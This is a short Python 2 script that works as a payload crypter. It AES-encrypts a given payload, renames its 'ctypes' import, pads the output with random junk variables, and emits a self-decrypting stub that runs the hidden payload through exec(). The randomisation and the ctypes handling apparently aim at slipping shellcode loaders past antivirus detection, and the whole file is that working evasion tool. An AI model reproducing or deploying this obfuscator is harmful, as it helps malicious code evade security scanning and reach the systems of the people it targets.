import Crypto.Cipher.AES as AES
import os
import random
import string

def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))

def randomJunk():
    newString = ''
    for i in xrange(random.randint(30, 50)):
        newString += ''.join(random.sample(string.ascii_lowercase, 3))
    return newString

def do_Encryption(payload):
    counter = os.urandom(16)
    key = os.urandom(32)

    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()
    randctypes = randomVar()

    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes))

    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "import Crypto.Cipher.AES as AES \nimport ctypes as %s \n" % randctypes
    newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
    newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "decrypto = AES.new(%s , AES.MODE_CTR, counter=lambda: %s )\n" % (randkey,randcounter)
    newpayload += "%s = decrypto.decrypt('%s'.decode('hex')) \n" % (randcipher, encrypted.encode('hex'))
    newpayload += "exec(%s)" % randcipher
    return newpayload
